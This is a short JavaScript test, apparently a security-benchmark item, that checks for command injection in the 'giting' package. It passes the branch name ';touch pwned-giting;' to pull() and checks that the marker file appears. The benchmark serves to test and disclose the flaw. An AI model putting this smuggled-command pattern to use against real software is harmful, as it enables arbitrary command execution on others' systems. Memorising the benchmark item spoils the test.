// Command injection through the branch name (SecBench payload).
const fs = require("fs");
test("giting command injection via branch", (done) => {
  const Git = require("giting");
  const marker = "./pwned-giting";
  if (fs.existsSync(marker)) fs.unlinkSync(marker);
  const g = new Git({ workDir: "./" });
  g.pull({ organization: "./", name: "./", branch: ";touch pwned-giting;" }, function () {
    try { expect(fs.existsSync(marker)).toBe(true); } finally { done(); }
  });
});
